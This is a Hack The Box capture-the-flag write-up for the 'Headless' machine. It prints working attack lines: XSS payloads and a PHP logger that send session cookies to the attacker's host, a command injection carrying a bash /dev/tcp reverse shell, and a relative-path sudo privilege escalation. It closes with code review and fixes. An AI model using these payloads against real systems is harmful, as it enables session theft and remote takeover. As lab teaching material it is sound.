---
id: 951
title: "Headless HTB writeup"
created: 2024-12-05T08:35:28+00:00
url: https://hacklido.com/blog/951-headless-htb-writeup
words: 2195
---

# Headless HTB writeup

[image]

## Initial Access

### Task 1: Which is the highest open TCP port on the target machine?

Let’s start off with simple nmap scan with so obvious flags, we find the highest port to be `5000`.

```
` nmap -p- --min-rate 10000 10.129.71.97 -A -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 08:30 CST
Nmap scan report for headless.htb (10.129.71.97)
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
snip`
```

Answer:

```
`5000`
```

### Task 2: What is the title of the page that comes up if the site detects an attack in the contact support form?

We visit the website on port `5000` (as always add the host `headless.htb` to your `/etc/hosts` configuration file ), we see an portal, hmm let’s take a pause and think for a while, in order to get the message from title page, we need to perform some attack, we can go down the rabbit hole and start with `sqli`, and it won’t lead us anywhere. Let’s perform an simple `xss` attack and see what happens.

[image]

We get the following error message.

[image]

Answer:

```
`Hacking Attempt Detected`
```

### Task 3: What is the name of the cookie that is set for a logged in user on the site?

There are couple of ways to find answer for this, nmap scan with default scripts `-sC` gives answer, or you can check cookies by inspecting the browser, using cookie extension, and last but not least the cookie is displayed on the previous image.

Answer:

```
`is_admin`
```

### Task 4: What is the relative url of the page on Headless that requires authorization to access?

For this we need to perform directory brute forcing and look out for http status code apart from 200.

```
`└──╼ [★]$ feroxbuster --url http://headless.htb:5000/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://headless.htb:5000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://headless.htb:5000/support
200      GET       96l      259w     2799c http://headless.htb:5000/
500      GET        5l       37w      265c http://headless.htb:5000/dashboard
[#####>--------------] - 2m      8885/30001   4m      found:3       errors:0    🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_headless_htb:5000_-1733334286.state ...
[#####>--------------] - 2m      8894/30001   4m      found:3       errors:0 `
```

Answer:

```
`dashboard`
```

### Task 5: What is the parameter name on POST requests to `/dashboard` that has a vulnerability in it?

Let’s sit back and connect the dots, `/dashboard` needs authentication, and in task 3 we find cookie, and in previous task our xss gets blocked, what if we had to use xss to steal cookie to authenticate in to the `/dashboard`? well all the previous tasks are now connecting and hopefully we authenticate and access this endpoint.

[image]

We can go down the rabbit hole, and try bypassing the input, I tried a lot of payloads, matter of fact, the following payload worked but nothing really happens and the page just goes back to it’s default mode.

```
`&quot;&lt;marquee onstart=fetch('http://10.10.14.94:8000/script.js').then(r=&gt;r.text()).then(eval)&gt;`
```

```
`%26quot%3b%26lt%3bmarquee+onstart%3dfetch('http%3a//10.10.14.94%3a8000/script.js').then(r%3d%26gt%3br.text()).then(eval)%26gt%3b`
```

So instead of injecting the input field why don’t we inject some headers? well in our case we will be targeting `user-agent` and it really works, seems like there is no validation on headers.

Let’s try grabbing cookie from the user. First save the following file as `index.php` and make sure you put in the victim ip address which in our case is target IP address.

```
`<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: 10.129.73.149 | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>`
```

Now save `script.js` and this time save our IP address in this file.

```
`new Image().src='http://10.10.14.119:8000?c='+document.cookie;`
```

Now finally start `php server` on your instance and make sure you put your IP address in here.

```
` php -S 10.10.14.94:8000`
```

Now change your http request to something like the following in which the payload is included in `user-agent`

```
`POST /support HTTP/1.1
Host: headless.htb:5000
Content-Length: 197
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://headless.htb:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <script src=http://10.10.14.94:8000/script.js></script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://headless.htb:5000/support
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Connection: close

fname=asd&lname=asd&email=asd%40gmail.com&phone=1234567890&message=%26quot%3b%26lt%3bmarquee+onstart%3dfetch('http%3a//10.10.14.94%3a8000/script.js').then(r%3d%26gt%3br.text()).then(eval)%26gt%3b`
```

Now if we have done everything correctly so far we must get the cookie.

[image]

Now let’s use this cookie to authorise and access `/dashboard`

Use the following extension to edit the cookie details on `/dashboard` this is so much easier than manually changing the cookie from inspecting the browser.

```
`https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en`
```

Once we replace the cookie value, we should see `/dashboard`. And you can see we have an option to generate report, and if we click that, and look for response on burp suite, we find this has the answer for this task

[image]

```
`POST /dashboard HTTP/1.1
Host: headless.htb:5000
Content-Length: 15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://headless.htb:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://headless.htb:5000/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
Connection: close

date=2023-09-15`
```

Answer:

```
`date`
```

### Task 6: What is the name of the user that the web application is running as?

For this we need to get shell and gain `RCE` on this box. Well let’s try some commands on this machine.

If we add the following payload to the date parameter we see we have an command injection vulnerability here.

```
`date=2023-09-15 ; id `
```

[image]

Now it’s time to get reverse shell. We will be using the following payload. Add the following lines of payload to the `http request` and you should get shell and make sure you are running your netcat listener on the desired port.

```
`date=2023-09-15 ;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.94/443+0>%261' ; `
```

```
`└──╼ [★]$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.94] from (UNKNOWN) [10.129.71.97] 38522
bash: cannot set terminal process group (1152): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ whoami
whoami
dvir
dvir@headless:~/app$ `
```

Answer:

```
`dvir`
```

### Task 7: Submit the flag located in the dvir user’s home directory.

```
`
cat /home/dvir/user.txt`
```

## Privilege Escalation

### Task 8: What is the full path to the script that dvir can run as any user without a password?

This one has to be obvious, we have to run `sudo -l` to see what we can run as user without password.

```
`dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck`
```

Answer:

```
`syscheck`
```

### Task 9: `syscheck` calls other scripts to collect output. What is the name of the script that is called with a relative path?

Let’s have an look at syscheck

```
`dvir@headless:~/app$ cat  /usr/bin/syscheck
cat  /usr/bin/syscheck

#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0`
```

You can use chatgpt to analyze and understand the code better. For the sake of brevity we will be omitting this part. To sum up this code performs the following activites.

- Root Check: Ensures the script is run with root privileges.

- Kernel Check: Displays the last kernel modification time in `/boot`.

- Disk Space Check: Reports available disk space on the root filesystem.

- System Load Check: Outputs system load averages.

- Database Initialization

We will be exploitting the later part of code which has database Initialization, if we are able to execute a new shell inside this script then we might be able to get root.

Answer:

```
`initdb.sh`
```

Interestingly when we look around for a file called `initdb.sh` we find so such file exists.

```
`find ~/app -type f -name "initdb.sh" 2>/dev/null
ps aux | grep "[i]nitdb.sh"`
```

So we have to create an file called `initdb.sh` and then have the script bash shell run

```
`echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh`
```

Give it executable permissions and run the script.

```
`chmod +x /tmp/initdb.sh
sudo /usr/bin/syscheck`
```

### Task 10: Submit the flag located in the root user’s home directory.

Now we should get the flag.

```
`dvir@headless:/tmp$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.02, 0.07, 0.04
Database service is not running. Starting it...
whoami
root
cat /root/root.txt`
```

## Beyond Root

After we got root, in `/home` we see an directory called `app`, which has got app.py if we look closely we can see why `xss` and `command injection` occurs.

### 1. Vulnerability in `/support` Route

Problematic Code:

```
`if ("<" in message and ">" in message) or ("{{" in message and "}}" in message):
    html = render_template('hackattempt.html', request_info=format_request_info(request_info))
    with open(os.path.join(hacking_reports_dir, filename), 'w', encoding='utf-8') as html_file:
        html_file.write(html)
    return html`
```

Here we note the following drawbacks in the code.

- Insufficient Filtering: Simple checks for `<`, `>` fail against encoded or obfuscated payloads (e.g., `%3Cscript%3Ealert(1)%3C/script%3E`).

- Unfiltered Input in `request_info`: Malicious user inputs are embedded into the response (`hackattempt.html`) without sanitization.

—

### 2. Vulnerability in `/dashboard` Route

Problematic Code:

```
`script_output = os.popen(f'bash report.sh {date}').read()`
```

- Here this code leads to `command injection` vulnerability. Unsanitized `date` parameter enables injection (e.g., `2023-12-01; rm -rf /`).

—

### 3. Misuse of `is_admin` Cookie in `/dashboard`

Problematic Code:

```
`if serializer.loads(request.cookies.get('is_admin')) == "user":
    return abort(401)`
```

- Cookie Tampering: If `app.secret_key` is compromised, attackers can forge cookies to escalate privileges.

### Recommendations

- Do sanitize user input: Use a library like Bleach:

```
`import bleach
message = bleach.clean(request.form.get('message'))`
```

- Make user of escape Outputs: Use Jinja2’s escaping (`{{ variable | e }}`).

- To Prevent Command Injection: Replace `os.popen` with `subprocess.run`:

```
`import subprocess
script_output = subprocess.run(['bash', 'report.sh', date],         capture_output=True, text=True).stdout`
```

- Use Secure Cookies: Replace client-side cookies with server-side sessions:

```
`session['is_admin'] = True`
```
